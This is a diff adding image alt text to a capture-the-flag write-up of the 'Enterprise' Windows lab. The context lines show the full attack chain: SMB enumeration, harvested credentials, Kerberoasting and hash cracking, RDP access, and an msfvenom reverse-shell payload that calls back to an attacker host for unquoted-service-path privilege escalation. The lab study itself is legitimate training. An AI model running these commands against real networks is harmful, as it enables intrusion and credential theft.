@@ -28,17 +28,17 @@ I performed an **nmap** aggressive scan on the target to find open ports and the
 nmap -A -Pn -p- TARGET --min-rate 10000 -oN enterprise.nmap
 ```
 
-![](https://cdn.ziomsec.com/enterprise/1.webp)
+![running an nmap scan on enterprise machine](https://cdn.ziomsec.com/enterprise/1.webp)
 
-![](https://cdn.ziomsec.com/enterprise/2.webp)
+![running an nmap scan on enterprise machine](https://cdn.ziomsec.com/enterprise/2.webp)
 
 ## Initial Foothold
 
 I accessed the web application running on port 80 and 7990.
 
-![](https://cdn.ziomsec.com/enterprise/3.webp)
+![accessing the web application](https://cdn.ziomsec.com/enterprise/3.webp)
 
-![](https://cdn.ziomsec.com/enterprise/4.webp)
+![accessing the atlassian login panel](https://cdn.ziomsec.com/enterprise/4.webp)
 
 I fuzzed hidden files and found a *robots.txt* file on the domain controllers web app. This seemed wierd so I accessed it through my browser.
 
@@ -46,7 +46,7 @@ I fuzzed hidden files and found a *robots.txt* file on the domain controllers we
 ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt
 ```
 
-![](https://cdn.ziomsec.com/enterprise/5.webp)
+![fuzzing hidden files on the web application](https://cdn.ziomsec.com/enterprise/5.webp)
 
 However, I did not get any useful information. I then looked for smb shares using **smbclient**.
 
@@ -54,7 +54,7 @@ However, I did not get any useful information. I then looked for smb shares usin
 smbclient -L TARGET -U ""
 ```
 
-![](https://cdn.ziomsec.com/enterprise/6.webp)
+![enumerating available SMB shares](https://cdn.ziomsec.com/enterprise/6.webp)
 
 There were 2 interesting shares. I first accessed the *docs* share and downloaded the files present in it.
 
@@ -62,7 +62,7 @@ There were 2 interesting shares. I first accessed the *docs* share and downloade
 smbclient \\\\TARGET\\docs -U ""
 ```
 
-![](https://cdn.ziomsec.com/enterprise/7.webp)
+![connecting to the SMB share](https://cdn.ziomsec.com/enterprise/7.webp)
 
 Both the documents were password protected, so I couldn't open it. I then accessed the *Users* share.
 
@@ -70,7 +70,7 @@ Both the documents were password protected, so I couldn't open it. I then access
 smbclient \\\\TARGET\\Users -U ""
 ```
 
-![](https://cdn.ziomsec.com/enterprise/8.webp)
+![connecting to the SMB share](https://cdn.ziomsec.com/enterprise/8.webp)
 
 It had a bunch of files so I downloaded everything.
 
@@ -80,7 +80,7 @@ prompt off
 mget *
 ```
 
-![](https://cdn.ziomsec.com/enterprise/9.webp)
+![downloading all files from the SMB share](https://cdn.ziomsec.com/enterprise/9.webp)
 
 I used the `find` command to look for files containing words like `history` or `secret` or something similar in their name and examined them.
 
@@ -90,21 +90,21 @@ find /root/thm/enterprise/APPADMIN/ -type f -name "*history*"
 
 I found a credential inside a file called `Consolehost_history.txt`.
 
-![](https://cdn.ziomsec.com/enterprise/10.webp)
+![credential file](https://cdn.ziomsec.com/enterprise/10.webp)
 
-![](https://cdn.ziomsec.com/enterprise/11.webp)
+![reading the credential file](https://cdn.ziomsec.com/enterprise/11.webp)
 
 I tested the credential to see if I could use it for command execution but failed. The Atlassian login page said they were shifting to github, so i looked for its github.
 
 I found the organization on github and viewed its members.
 
-![](https://cdn.ziomsec.com/enterprise/12.webp)
+![viewing the organization on github](https://cdn.ziomsec.com/enterprise/12.webp)
 
 I accessed the user profile and viewed the uploaded script. This revealed a new set of credentials.
 
-![](https://cdn.ziomsec.com/enterprise/13.webp)
+![github profile on the member of target organization](https://cdn.ziomsec.com/enterprise/13.webp)
 
-![](https://cdn.ziomsec.com/enterprise/14.webp)
+![viewing the commit](https://cdn.ziomsec.com/enterprise/14.webp)
 
 These were valid credentials but it didn't allow executing commands.
 
@@ -112,7 +112,7 @@ These were valid credentials but it didn't allow executing commands.
 nxc smb TARGET -u 'nik' -p 'ToastyBoi!'
 ```
 
-![](https://cdn.ziomsec.com/enterprise/15.webp)
+![verifying the credentials aagainst rdp and smb](https://cdn.ziomsec.com/enterprise/15.webp)
 
 I used these credentials to look for any other share that might be reserved for the user. However, I found nothing.
 
@@ -126,7 +126,7 @@ I then enumerated the users and found  the credential of another user in its des
 nxc smb TARGET -u 'nik' -p 'ToastyBoi!' --users
 ```
 
-![](https://cdn.ziomsec.com/enterprise/16.webp)
+![enumerating users via smb](https://cdn.ziomsec.com/enterprise/16.webp)
 
 I tested these creds aswell but it didnt provide access to the system.
 
@@ -141,7 +141,7 @@ I then looked for kerberoastable accounts and got the kerberoast hash for the us
 impacket-GetUserSPNs LAB.ENTERPRISE.THM/nik:'ToastyBoi!' -dc-ip TARGET -request
 ```
 
-![](https://cdn.ziomsec.com/enterprise/17.webp)
+![kerberoasting bitbucket user](https://cdn.ziomsec.com/enterprise/17.webp)
 
 I then cracked the hash using **john**
 
@@ -149,7 +149,7 @@ I then cracked the hash using **john**
 john --wordlist=/usr/share/wordlists/rockyou.txt HASH
 ```
 
-![](https://cdn.ziomsec.com/enterprise/18.webp)
+![cracking the hash with john](https://cdn.ziomsec.com/enterprise/18.webp)
 
 Finally, I accessed the machine using this credential - through **rdp**.
 
@@ -157,11 +157,11 @@ Finally, I accessed the machine using this credential - through **rdp**.
 xfreerdp /u:'bitbucket' /p:'littleredbucket' /v:TARGET
 ```
 
-![](https://cdn.ziomsec.com/enterprise/19.webp)
+![accessing the target via RDP](https://cdn.ziomsec.com/enterprise/19.webp)
 
 I then accessed the user flag from the Desktop.
 
-![](https://cdn.ziomsec.com/enterprise/20.webp)
+![capturing the user flag](https://cdn.ziomsec.com/enterprise/20.webp)
 
 ## Privilege Escalation
 
@@ -178,7 +178,7 @@ Import-Module .\PowerUp.ps1
 Invoke-AllChecks
 ```
 
-![](https://cdn.ziomsec.com/enterprise/21.webp)
+![running PowerUp for privesc check](https://cdn.ziomsec.com/enterprise/21.webp)
 
 It discovered an **unquoted service path** vulnerability.
 
@@ -186,7 +186,7 @@ It discovered an **unquoted service path** vulnerability.
 sc.exe qc zerotieroneservice
 ```
 
-![](https://cdn.ziomsec.com/enterprise/22.webp)
+![verifying unquoted service path](https://cdn.ziomsec.com/enterprise/22.webp)
 
 I then verified my access on the path of the exe.
 
@@ -194,7 +194,7 @@ I then verified my access on the path of the exe.
 cacls 'C:\Program Files (x86)\Zero Tier\'
 ```
 
-![](https://cdn.ziomsec.com/enterprise/23.webp)
+![verifying access on the path](https://cdn.ziomsec.com/enterprise/23.webp)
 
 Since I had access, I created a payload using **msfvenom** and upload it on the vulnerable path.
 
@@ -202,7 +202,7 @@ Since I had access, I created a payload using **msfvenom** and upload it on the 
 msfvenom -p windows/shell_reverse_tcp lhost=ATTACKER lport=1234 -f exe-service -o ZeroTier.exe
 ```
 
-![](https://cdn.ziomsec.com/enterprise/24.webp)
+![creating a payload with msfvenom](https://cdn.ziomsec.com/enterprise/24.webp)
 
 Finally, I started a listener on my local machine and restarted the service.
 
@@ -211,11 +211,11 @@ sc.exe stop zerotieroneservice
 sc.exe start zerotieroneservice
 ```
 
-![](https://cdn.ziomsec.com/enterprise/25.webp)
+![uploading the payload and executing it](https://cdn.ziomsec.com/enterprise/25.webp)
 
 I got a reverse shell as **nt authority\system**.
 
-![](https://cdn.ziomsec.com/enterprise/26.webp)
+![gaining NT Authority\System access](https://cdn.ziomsec.com/enterprise/26.webp)
 
 I then captured the root flag from **Administrator's** desktop.
 
@@ -223,7 +223,7 @@ I then captured the root flag from **Administrator's** desktop.
 more C:\Users\Administrator\Desktop\root.txt
 ```
 
-![](https://cdn.ziomsec.com/enterprise/27.webp)
+![Capturing the root flag](https://cdn.ziomsec.com/enterprise/27.webp)
 
 That's it from my end! Until next time :)
 
